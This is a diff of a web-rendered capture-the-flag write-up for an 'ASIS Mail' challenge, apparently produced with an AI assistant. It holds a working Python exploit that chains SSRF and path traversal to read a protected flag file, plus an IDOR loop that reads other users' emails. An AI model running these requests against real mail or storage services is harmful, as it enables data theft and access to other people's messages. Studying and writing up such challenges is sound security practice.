+</span><span id="__span-6-20"><a id="__codelineno-6-20" name="__codelineno-6-20" href="#__codelineno-6-20"></a>    <span class="n">session</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;</span><span class="si">{</span><span class="n">BASE_URL</span><span class="si">}</span><span class="s2">/sso/register&quot;</span><span class="p">,</span> <span class="n">json</span><span class="o">=</span><span class="p">{</span><span class="s2">&quot;username&quot;</span><span class="p">:</span> <span class="n">username</span><span class="p">,</span> <span class="s2">&quot;password&quot;</span><span class="p">:</span> <span class="n">password</span><span class="p">})</span>
+</span><span id="__span-6-21"><a id="__codelineno-6-21" name="__codelineno-6-21" href="#__codelineno-6-21"></a>    <span class="n">resp</span> <span class="o">=</span> <span class="n">session</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;</span><span class="si">{</span><span class="n">BASE_URL</span><span class="si">}</span><span class="s2">/sso/login&quot;</span><span class="p">,</span> <span class="n">json</span><span class="o">=</span><span class="p">{</span><span class="s2">&quot;username&quot;</span><span class="p">:</span> <span class="n">username</span><span class="p">,</span> <span class="s2">&quot;password&quot;</span><span class="p">:</span> <span class="n">password</span><span class="p">})</span>
+</span><span id="__span-6-22"><a id="__codelineno-6-22" name="__codelineno-6-22" href="#__codelineno-6-22"></a>    <span class="n">data</span> <span class="o">=</span> <span class="n">resp</span><span class="o">.</span><span class="n">json</span><span class="p">()</span>
+</span><span id="__span-6-23"><a id="__codelineno-6-23" name="__codelineno-6-23" href="#__codelineno-6-23"></a>    <span class="n">token</span> <span class="o">=</span> <span class="n">data</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&quot;token&quot;</span><span class="p">)</span>
+</span><span id="__span-6-24"><a id="__codelineno-6-24" name="__codelineno-6-24" href="#__codelineno-6-24"></a>    <span class="n">user_id</span> <span class="o">=</span> <span class="n">data</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&quot;user&quot;</span><span class="p">,</span> <span class="p">{})</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&quot;userId&quot;</span><span class="p">)</span>
+</span><span id="__span-6-25"><a id="__codelineno-6-25" name="__codelineno-6-25" href="#__codelineno-6-25"></a>    <span class="n">headers</span> <span class="o">=</span> <span class="p">{</span><span class="s2">&quot;Authorization&quot;</span><span class="p">:</span> <span class="sa">f</span><span class="s2">&quot;Bearer </span><span class="si">{</span><span class="n">token</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">}</span>
+</span><span id="__span-6-26"><a id="__codelineno-6-26" name="__codelineno-6-26" href="#__codelineno-6-26"></a>    <span class="n">my_email</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&quot;</span><span class="si">{</span><span class="n">username</span><span class="si">}</span><span class="s2">@asismail.local&quot;</span>
+</span><span id="__span-6-27"><a id="__codelineno-6-27" name="__codelineno-6-27" href="#__codelineno-6-27"></a>
+</span><span id="__span-6-28"><a id="__codelineno-6-28" name="__codelineno-6-28" href="#__codelineno-6-28"></a>    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;User: </span><span class="si">{</span><span class="n">username</span><span class="si">}</span><span class="s2"> (ID: </span><span class="si">{</span><span class="n">user_id</span><span class="si">}</span><span class="s2">)&quot;</span><span class="p">)</span>
+</span><span id="__span-6-29"><a id="__codelineno-6-29" name="__codelineno-6-29" href="#__codelineno-6-29"></a>
+</span><span id="__span-6-30"><a id="__codelineno-6-30" name="__codelineno-6-30" href="#__codelineno-6-30"></a>    <span class="c1"># SSRF with path traversal using our own bucket</span>
+</span><span id="__span-6-31"><a id="__codelineno-6-31" name="__codelineno-6-31" href="#__codelineno-6-31"></a>    <span class="n">ssrf_url</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&quot;http://objectstore:8082/public/</span><span class="si">{</span><span class="n">user_id</span><span class="si">}</span><span class="s2">/../FLAG/</span><span class="si">{</span><span class="n">FLAG_FILENAME</span><span class="si">}</span><span class="s2">&quot;</span>
+</span><span id="__span-6-32"><a id="__codelineno-6-32" name="__codelineno-6-32" href="#__codelineno-6-32"></a>
+</span><span id="__span-6-33"><a id="__codelineno-6-33" name="__codelineno-6-33" href="#__codelineno-6-33"></a>    <span class="n">xml</span> <span class="o">=</span> <span class="sa">f</span><span class="s1">&#39;&#39;&#39;&lt;message&gt;</span>
+</span><span id="__span-6-34"><a id="__codelineno-6-34" name="__codelineno-6-34" href="#__codelineno-6-34"></a><span class="s1">    &lt;to&gt;</span><span class="si">{</span><span class="n">my_email</span><span class="si">}</span><span class="s1">&lt;/to&gt;</span>
+</span><span id="__span-6-35"><a id="__codelineno-6-35" name="__codelineno-6-35" href="#__codelineno-6-35"></a><span class="s1">    &lt;subject&gt;GetFlag&lt;/subject&gt;</span>
+</span><span id="__span-6-36"><a id="__codelineno-6-36" name="__codelineno-6-36" href="#__codelineno-6-36"></a><span class="s1">    &lt;body&gt;flag&lt;/body&gt;</span>
+</span><span id="__span-6-37"><a id="__codelineno-6-37" name="__codelineno-6-37" href="#__codelineno-6-37"></a><span class="s1">    &lt;attachment_url&gt;</span><span class="si">{</span><span class="n">ssrf_url</span><span class="si">}</span><span class="s1">&lt;/attachment_url&gt;</span>
+</span><span id="__span-6-38"><a id="__codelineno-6-38" name="__codelineno-6-38" href="#__codelineno-6-38"></a><span class="s1">&lt;/message&gt;&#39;&#39;&#39;</span>
+</span><span id="__span-6-39"><a id="__codelineno-6-39" name="__codelineno-6-39" href="#__codelineno-6-39"></a>
+</span><span id="__span-6-40"><a id="__codelineno-6-40" name="__codelineno-6-40" href="#__codelineno-6-40"></a>    <span class="n">resp</span> <span class="o">=</span> <span class="n">session</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;</span><span class="si">{</span><span class="n">BASE_URL</span><span class="si">}</span><span class="s2">/api/compose&quot;</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">,</span> <span class="n">files</span><span class="o">=</span><span class="p">{</span><span class="s2">&quot;xml&quot;</span><span class="p">:</span> <span class="p">(</span><span class="kc">None</span><span class="p">,</span> <span class="n">xml</span><span class="p">)})</span>
+</span><span id="__span-6-41"><a id="__codelineno-6-41" name="__codelineno-6-41" href="#__codelineno-6-41"></a>    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Compose: </span><span class="si">{</span><span class="n">resp</span><span class="o">.</span><span class="n">status_code</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+</span><span id="__span-6-42"><a id="__codelineno-6-42" name="__codelineno-6-42" href="#__codelineno-6-42"></a>
+</span><span id="__span-6-43"><a id="__codelineno-6-43" name="__codelineno-6-43" href="#__codelineno-6-43"></a>    <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+</span><span id="__span-6-44"><a id="__codelineno-6-44" name="__codelineno-6-44" href="#__codelineno-6-44"></a>
+</span><span id="__span-6-45"><a id="__codelineno-6-45" name="__codelineno-6-45" href="#__codelineno-6-45"></a>    <span class="c1"># Retrieve flag from inbox</span>
+</span><span id="__span-6-46"><a id="__codelineno-6-46" name="__codelineno-6-46" href="#__codelineno-6-46"></a>    <span class="n">resp</span> <span class="o">=</span> <span class="n">session</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;</span><span class="si">{</span><span class="n">BASE_URL</span><span class="si">}</span><span class="s2">/api/inbox&quot;</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">)</span>
+</span><span id="__span-6-47"><a id="__codelineno-6-47" name="__codelineno-6-47" href="#__codelineno-6-47"></a>    <span class="k">for</span> <span class="n">email</span> <span class="ow">in</span> <span class="n">resp</span><span class="o">.</span><span class="n">json</span><span class="p">():</span>
+</span><span id="__span-6-48"><a id="__codelineno-6-48" name="__codelineno-6-48" href="#__codelineno-6-48"></a>        <span class="k">if</span> <span class="n">email</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&quot;subject&quot;</span><span class="p">)</span> <span class="o">==</span> <span class="s2">&quot;GetFlag&quot;</span><span class="p">:</span>
+</span><span id="__span-6-49"><a id="__codelineno-6-49" name="__codelineno-6-49" href="#__codelineno-6-49"></a>            <span class="n">email_resp</span> <span class="o">=</span> <span class="n">session</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;</span><span class="si">{</span><span class="n">BASE_URL</span><span class="si">}</span><span class="s2">/api/mail/</span><span class="si">{</span><span class="n">email</span><span class="p">[</span><span class="s1">&#39;id&#39;</span><span class="p">]</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">)</span>
+</span><span id="__span-6-50"><a id="__codelineno-6-50" name="__codelineno-6-50" href="#__codelineno-6-50"></a>            <span class="n">email_data</span> <span class="o">=</span> <span class="n">email_resp</span><span class="o">.</span><span class="n">json</span><span class="p">()</span>
+</span><span id="__span-6-51"><a id="__codelineno-6-51" name="__codelineno-6-51" href="#__codelineno-6-51"></a>
+</span><span id="__span-6-52"><a id="__codelineno-6-52" name="__codelineno-6-52" href="#__codelineno-6-52"></a>            <span class="k">for</span> <span class="n">att</span> <span class="ow">in</span> <span class="n">email_data</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&quot;attachments&quot;</span><span class="p">,</span> <span class="p">[]):</span>
+</span><span id="__span-6-53"><a id="__codelineno-6-53" name="__codelineno-6-53" href="#__codelineno-6-53"></a>                <span class="n">att_url</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&quot;/files</span><span class="si">{</span><span class="n">att</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;url&#39;</span><span class="p">)</span><span class="si">}</span><span class="s2">&quot;</span>
+</span><span id="__span-6-54"><a id="__codelineno-6-54" name="__codelineno-6-54" href="#__codelineno-6-54"></a>                <span class="n">r</span> <span class="o">=</span> <span class="n">session</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;</span><span class="si">{</span><span class="n">BASE_URL</span><span class="si">}{</span><span class="n">att_url</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+</span><span id="__span-6-55"><a id="__codelineno-6-55" name="__codelineno-6-55" href="#__codelineno-6-55"></a>                <span class="k">if</span> <span class="s2">&quot;ASIS{&quot;</span> <span class="ow">in</span> <span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="p">:</span>
+</span><span id="__span-6-56"><a id="__codelineno-6-56" name="__codelineno-6-56" href="#__codelineno-6-56"></a>                    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">FLAG: </span><span class="si">{</span><span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+</span><span id="__span-6-57"><a id="__codelineno-6-57" name="__codelineno-6-57" href="#__codelineno-6-57"></a>                    <span class="k">return</span>
+</span><span id="__span-6-58"><a id="__codelineno-6-58" name="__codelineno-6-58" href="#__codelineno-6-58"></a>
+</span><span id="__span-6-59"><a id="__codelineno-6-59" name="__codelineno-6-59" href="#__codelineno-6-59"></a><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&quot;__main__&quot;</span><span class="p">:</span>
+</span><span id="__span-6-60"><a id="__codelineno-6-60" name="__codelineno-6-60" href="#__codelineno-6-60"></a>    <span class="n">main</span><span class="p">()</span>
+</span></code></pre></div>
+<h2 id="what-i-learned">What I Learned<a class="headerlink" href="#what-i-learned" title="Permanent link">&para;</a></h2>
+<p>This challenge was all about recognizing how vulnerabilities can be chained together. Individually, each vulnerability was limited:</p>
 <ul>
-<li><strong>Frontend (nginx)</strong>: Reverse proxy handling routing</li>
-<li><strong>API (Go)</strong>: Main application logic for email composition</li>
-<li><strong>SSO (Node.js)</strong>: Authentication service</li>
-<li><strong>Objectstore (Python/Flask)</strong>: File storage service</li>
-<li><strong>PostgreSQL</strong>: Database</li>
+<li>The SSRF could only fetch internal services that I already knew about</li>
+<li>The path traversal needed the bucket check to be bypassed</li>
+<li>The IDOR just let me read other users' emails</li>
 </ul>
-<h3 id="key-files-structure">Key Files Structure<a class="headerlink" href="#key-files-structure" title="Permanent link">&para;</a></h3>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>ASIS_Mail/
-</span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a>├── api/api (Go binary)
-</span><span id="__span-0-3"><a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a>├── frontend/nginx.conf
-</span><span id="__span-0-4"><a id="__codelineno-0-4" name="__codelineno-0-4" href="#__codelineno-0-4"></a>├── objectstore/app.py
-</span><span id="__span-0-5"><a id="__codelineno-0-5" name="__codelineno-0-5" href="#__codelineno-0-5"></a>├── sso/index.js
-</span><span id="__span-0-6"><a id="__codelineno-0-6" name="__codelineno-0-6" href="#__codelineno-0-6"></a>├── db/init.sql
-</span><span id="__span-0-7"><a id="__codelineno-0-7" name="__codelineno-0-7" href="#__codelineno-0-7"></a>└── docker-compose.yml
-</span></code></pre></div>
-<h2 id="vulnerability-analysis">Vulnerability Analysis<a class="headerlink" href="#vulnerability-analysis" title="Permanent link">&para;</a></h2>
-<h3 id="1-ssrf-in-compose-endpoint">1. SSRF in Compose Endpoint<a class="headerlink" href="#1-ssrf-in-compose-endpoint" title="Permanent link">&para;</a></h3>
-<p>The API's <code>/compose</code> endpoint accepts XML input with an <code>attachment_url</code> field. When provided, the API fetches content from this URL and stores it as an email attachment.</p>
-<div class="language-xml highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a><span class="nt">&lt;message&gt;</span>
-</span><span id="__span-1-2"><a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a><span class="w">    </span><span class="nt">&lt;to&gt;</span>user@asismail.local<span class="nt">&lt;/to&gt;</span>
-</span><span id="__span-1-3"><a id="__codelineno-1-3" name="__codelineno-1-3" href="#__codelineno-1-3"></a><span class="w">    </span><span class="nt">&lt;subject&gt;</span>Test<span class="nt">&lt;/subject&gt;</span>
-</span><span id="__span-1-4"><a id="__codelineno-1-4" name="__codelineno-1-4" href="#__codelineno-1-4"></a><span class="w">    </span><span class="nt">&lt;body&gt;</span>test<span class="nt">&lt;/body&gt;</span>
-</span><span id="__span-1-5"><a id="__codelineno-1-5" name="__codelineno-1-5" href="#__codelineno-1-5"></a><span class="w">    </span><span class="nt">&lt;attachment_url&gt;</span>http://internal-service/path<span class="nt">&lt;/attachment_url&gt;</span>
-</span><span id="__span-1-6"><a id="__codelineno-1-6" name="__codelineno-1-6" href="#__codelineno-1-6"></a><span class="nt">&lt;/message&gt;</span>
-</span></code></pre></div>
-<h3 id="2-path-traversal-in-objectstore">2. Path Traversal in Objectstore<a class="headerlink" href="#2-path-traversal-in-objectstore" title="Permanent link">&para;</a></h3>
-<p>Examining <code>/home/claude/ASIS_Mail/objectstore/app.py</code>:</p>
-<div class="language-python highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a><span class="nd">@app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s2">&quot;/public/&lt;bucket&gt;/&lt;path:object_name&gt;&quot;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s2">&quot;GET&quot;</span><span class="p">])</span>
-</span><span id="__span-2-2"><a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a><span class="k">def</span><span class="w"> </span><span class="nf">public_file</span><span class="p">(</span><span class="n">bucket</span><span class="p">,</span> <span class="n">object_name</span><span class="p">):</span>
-</span><span id="__span-2-3"><a id="__codelineno-2-3" name="__codelineno-2-3" href="#__codelineno-2-3"></a>    <span class="k">if</span> <span class="n">bucket</span> <span class="o">==</span> <span class="s2">&quot;FLAG&quot;</span><span class="p">:</span>
-</span><span id="__span-2-4"><a id="__codelineno-2-4" name="__codelineno-2-4" href="#__codelineno-2-4"></a>        <span class="k">return</span> <span class="n">jsonify</span><span class="p">({</span><span class="s2">&quot;error&quot;</span><span class="p">:</span><span class="s2">&quot;forbidden&quot;</span><span class="p">}),</span> <span class="mi">403</span>
-</span><span id="__span-2-5"><a id="__codelineno-2-5" name="__codelineno-2-5" href="#__codelineno-2-5"></a>    <span class="n">file_path</span> <span class="o">=</span> <span class="n">STORAGE</span> <span class="o">/</span> <span class="n">bucket</span> <span class="o">/</span> <span class="n">object_name</span>
-</span><span id="__span-2-6"><a id="__codelineno-2-6" name="__codelineno-2-6" href="#__codelineno-2-6"></a>    <span class="k">if</span> <span class="ow">not</span> <span class="n">file_path</span><span class="o">.</span><span class="n">exists</span><span class="p">():</span>
-</span><span id="__span-2-7"><a id="__codelineno-2-7" name="__codelineno-2-7" href="#__codelineno-2-7"></a>        <span class="k">return</span> <span class="n">jsonify</span><span class="p">({</span><span class="s2">&quot;error&quot;</span><span class="p">:</span><span class="s2">&quot;not found&quot;</span><span class="p">}),</span> <span class="mi">404</span>
-</span><span id="__span-2-8"><a id="__codelineno-2-8" name="__codelineno-2-8" href="#__codelineno-2-8"></a>    <span class="k">return</span> <span class="n">send_file</span><span class="p">(</span><span class="n">file_path</span><span class="p">,</span> <span class="n">as_attachment</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
-</span></code></pre></div>
-<p>The vulnerability: While the code checks if <code>bucket == "FLAG"</code>, it doesn't sanitize path traversal in <code>object_name</code>. This means we can use <code>../</code> to escape to the FLAG directory.</p>
-<h3 id="3-hash-endpoint-without-flag-check">3. Hash Endpoint Without FLAG Check<a class="headerlink" href="#3-hash-endpoint-without-flag-check" title="Permanent link">&para;</a></h3>
-<div class="language-python highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a><span class="nd">@app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s2">&quot;/public/&lt;bucket&gt;/&lt;path:object_name&gt;/hash&quot;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s2">&quot;GET&quot;</span><span class="p">])</span>
-</span><span id="__span-3-2"><a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a><span class="k">def</span><span class="w"> </span><span class="nf">public_file_hash</span><span class="p">(</span><span class="n">bucket</span><span class="p">,</span> <span class="n">object_name</span><span class="p">):</span>
-</span><span id="__span-3-3"><a id="__codelineno-3-3" name="__codelineno-3-3" href="#__codelineno-3-3"></a>    <span class="n">file_path</span> <span class="o">=</span> <span class="n">STORAGE</span> <span class="o">/</span> <span class="n">bucket</span> <span class="o">/</span> <span class="n">object_name</span>
-</span><span id="__span-3-4"><a id="__codelineno-3-4" name="__codelineno-3-4" href="#__codelineno-3-4"></a>    <span class="k">if</span> <span class="ow">not</span> <span class="n">file_path</span><span class="o">.</span><span class="n">exists</span><span class="p">():</span>
-</span><span id="__span-3-5"><a id="__codelineno-3-5" name="__codelineno-3-5" href="#__codelineno-3-5"></a>        <span class="k">return</span> <span class="n">jsonify</span><span class="p">({</span><span class="s2">&quot;error&quot;</span><span class="p">:</span><span class="s2">&quot;not found&quot;</span><span class="p">}),</span> <span class="mi">404</span>
-</span><span id="__span-3-6"><a id="__codelineno-3-6" name="__codelineno-3-6" href="#__codelineno-3-6"></a>    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">file_path</span><span class="p">,</span> <span class="s2">&quot;rb&quot;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
-</span><span id="__span-3-7"><a id="__codelineno-3-7" name="__codelineno-3-7" href="#__codelineno-3-7"></a>        <span class="n">flag</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
-</span><span id="__span-3-8"><a id="__codelineno-3-8" name="__codelineno-3-8" href="#__codelineno-3-8"></a>    <span class="k">return</span> <span class="n">jsonify</span><span class="p">({</span><span class="s2">&quot;status&quot;</span><span class="p">:</span> <span class="s2">&quot;ok&quot;</span><span class="p">,</span> <span class="s2">&quot;content&quot;</span><span class="p">:</span> <span class="n">sha256</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">()}),</span> <span class="mi">200</span>
-</span></code></pre></div>
-<p><strong>Critical:</strong> The hash endpoint has NO <code>bucket == "FLAG"</code> check! This allows us to verify file existence and get the SHA256 hash of the flag.</p>
-<h3 id="4-idor-in-email-access">4. IDOR in Email Access<a class="headerlink" href="#4-idor-in-email-access" title="Permanent link">&para;</a></h3>
-<p>Testing revealed that any authenticated user can read any email by ID:</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a>GET /api/mail/1 → Returns email data regardless of ownership
-</span><span id="__span-4-2"><a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a>GET /api/mail/2 → Returns email data with attachments from other users
-</span></code></pre></div>
-<h2 id="flag-location">Flag Location<a class="headerlink" href="#flag-location" title="Permanent link">&para;</a></h2>
-<p>From the Dockerfile:
-<div class="language-dockerfile highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a><span class="k">ADD</span><span class="w"> </span>--chmod<span class="o">=</span><span class="m">444</span><span class="w"> </span>flag.txt<span class="w"> </span>.
-</span><span id="__span-5-2"><a id="__codelineno-5-2" name="__codelineno-5-2" href="#__codelineno-5-2"></a><span class="k">RUN</span><span class="w"> </span>mkdir<span class="w"> </span>-p<span class="w"> </span>/data/FLAG<span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span>mv<span class="w"> </span>flag.txt<span class="w"> </span>/data/FLAG/flag-<span class="k">$(</span>md5sum<span class="w"> </span>flag.txt<span class="w"> </span><span class="p">|</span><span class="w"> </span>awk<span class="w"> </span><span class="s1">&#39;{print $1}&#39;</span><span class="k">)</span>.txt
-</span></code></pre></div></p>
-<p>The flag is stored at <code>/data/FLAG/flag-&lt;md5hash&gt;.txt</code> where the hash is the MD5 of the flag content.</p>
-<h2 id="discovering-the-flag-filename-via-idor">Discovering the Flag Filename via IDOR<a class="headerlink" href="#discovering-the-flag-filename-via-idor" title="Permanent link">&para;</a></h2>
-<p>The flag filename follows the pattern <code>flag-&lt;md5sum&gt;.txt</code> where the MD5 is computed from the flag content. We don't know the flag content, so we can't compute the hash directly.</p>
-<p>However, we discovered an <strong>IDOR vulnerability</strong> in the <code>/api/mail/&lt;id&gt;</code> endpoint - any authenticated user can read ANY email by simply changing the ID number.</p>
-<h3 id="scanning-other-users-emails">Scanning Other Users' Emails<a class="headerlink" href="#scanning-other-users-emails" title="Permanent link">&para;</a></h3>
-<div class="language-python highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a><span class="c1"># IDOR - Read any email by ID</span>
-</span><span id="__span-6-2"><a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a><span class="k">for</span> <span class="n">email_id</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">800</span><span class="p">):</span>
-</span><span id="__span-6-3"><a id="__codelineno-6-3" name="__codelineno-6-3" href="#__codelineno-6-3"></a>    <span class="n">resp</span> <span class="o">=</span> <span class="n">session</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;</span><span class="si">{</span><span class="n">BASE_URL</span><span class="si">}</span><span class="s2">/api/mail/</span><span class="si">{</span><span class="n">email_id</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">)</span>
-</span><span id="__span-6-4"><a id="__codelineno-6-4" name="__codelineno-6-4" href="#__codelineno-6-4"></a>    <span class="k">if</span> <span class="n">resp</span><span class="o">.</span><span class="n">status_code</span> <span class="o">==</span> <span class="mi">200</span><span class="p">:</span>
-</span><span id="__span-6-5"><a id="__codelineno-6-5" name="__codelineno-6-5" href="#__codelineno-6-5"></a>        <span class="n">data</span> <span class="o">=</span> <span class="n">resp</span><span class="o">.</span><span class="n">json</span><span class="p">()</span>
-</span><span id="__span-6-6"><a id="__codelineno-6-6" name="__codelineno-6-6" href="#__codelineno-6-6"></a>        <span class="n">attachments</span> <span class="o">=</span> <span class="n">data</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&quot;attachments&quot;</span><span class="p">,</span> <span class="p">[])</span>
-</span><span id="__span-6-7"><a id="__codelineno-6-7" name="__codelineno-6-7" href="#__codelineno-6-7"></a>        <span class="k">if</span> <span class="n">attachments</span><span class="p">:</span>
-</span><span id="__span-6-8"><a id="__codelineno-6-8" name="__codelineno-6-8" href="#__codelineno-6-8"></a>            <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Email </span><span class="si">{</span><span class="n">email_id</span><span class="si">}</span><span class="s2">: </span><span class="si">{</span><span class="n">data</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;subject&#39;</span><span class="p">)</span><span class="si">}</span><span class="s2"> - </span><span class="si">{</span><span class="n">attachments</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
-</span></code></pre></div>
-<p>Output (excerpt):
-<div class="language-text highlight"><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a>[Email 2] Subject: a
-</span><span id="__span-7-2"><a id="__codelineno-7-2" name="__codelineno-7-2" href="#__codelineno-7-2"></a>    From: test@asismail.local
-</span><span id="__span-7-3"><a id="__codelineno-7-3" name="__codelineno-7-3" href="#__codelineno-7-3"></a>    Attachment: secweb.PNG -&gt; /public/1/2603441d-cc34-425d-bbc2-b2f89b086f52
-</span><span id="__span-7-4"><a id="__codelineno-7-4" name="__codelineno-7-4" href="#__codelineno-7-4"></a>
-</span><span id="__span-7-5"><a id="__codelineno-7-5" name="__codelineno-7-5" href="#__codelineno-7-5"></a>[Email 69] Subject: SSRF attachment
-</span><span id="__span-7-6"><a id="__codelineno-7-6" name="__codelineno-7-6" href="#__codelineno-7-6"></a>    From: testuser123@asismail.local
-</span><span id="__span-7-7"><a id="__codelineno-7-7" name="__codelineno-7-7" href="#__codelineno-7-7"></a>    Attachment: FLAG -&gt; /public/7/2d163169-4b2e-458d-9f11-60fc1b7faf56
-</span><span id="__span-7-8"><a id="__codelineno-7-8" name="__codelineno-7-8" href="#__codelineno-7-8"></a>    *** POTENTIAL FLAG ATTACHMENT! ***
-</span><span id="__span-7-9"><a id="__codelineno-7-9" name="__codelineno-7-9" href="#__codelineno-7-9"></a>    Content (404): {&quot;error&quot;:&quot;not found&quot;}
-</span><span id="__span-7-10"><a id="__codelineno-7-10" name="__codelineno-7-10" href="#__codelineno-7-10"></a>
-</span><span id="__span-7-11"><a id="__codelineno-7-11" name="__codelineno-7-11" href="#__codelineno-7-11"></a>[Email 343] Subject: flag
-</span><span id="__span-7-12"><a id="__codelineno-7-12" name="__codelineno-7-12" href="#__codelineno-7-12"></a>    From: flag_1766861609@asismail.local
-</span><span id="__span-7-13"><a id="__codelineno-7-13" name="__codelineno-7-13" href="#__codelineno-7-13"></a>    Attachment: flag-0750c96cfc2bd4b665865da15e9d5b94.txt -&gt; /public/114/00c0249d-49a9-419a-ae72-e6e25ccba116
-</span><span id="__span-7-14"><a id="__codelineno-7-14" name="__codelineno-7-14" href="#__codelineno-7-14"></a>    *** POTENTIAL FLAG ATTACHMENT! ***
-</span><span id="__span-7-15"><a id="__codelineno-7-15" name="__codelineno-7-15" href="#__codelineno-7-15"></a>    Content (404): {&quot;error&quot;:&quot;not found&quot;}
-</span><span id="__span-7-16"><a id="__codelineno-7-16" name="__codelineno-7-16" href="#__codelineno-7-16"></a>
-</span><span id="__span-7-17"><a id="__codelineno-7-17" name="__codelineno-7-17" href="#__codelineno-7-17"></a>[Email 509] Subject: get-flag
-</span><span id="__span-7-18"><a id="__codelineno-7-18" name="__codelineno-7-18" href="#__codelineno-7-18"></a>    From: userpz8udv@asismail.local
-</span><span id="__span-7-19"><a id="__codelineno-7-19" name="__codelineno-7-19" href="#__codelineno-7-19"></a>    Attachment: flag-0750c96cfc2bd4b665865da15e9d5b94.txt -&gt; /public/156/c986ad16-6d7a-4cf1-91c7-e5fce82e5f0b
-</span></code></pre></div></p>
-<h3 id="analyzing-other-users-attempts">Analyzing Other Users' Attempts<a class="headerlink" href="#analyzing-other-users-attempts" title="Permanent link">&para;</a></h3>
-<p>By examining the emails, we found:
-- Many users tried SSRF to <code>/FLAG</code> bucket but got "authorization required"
-- Some users discovered the exact filename: <code>flag-0750c96cfc2bd4b665865da15e9d5b94.txt</code>
-- The attachments returned 404 because files in user buckets are ephemeral</p>
-<p>The most common flag filename appearing in other users' attempts:
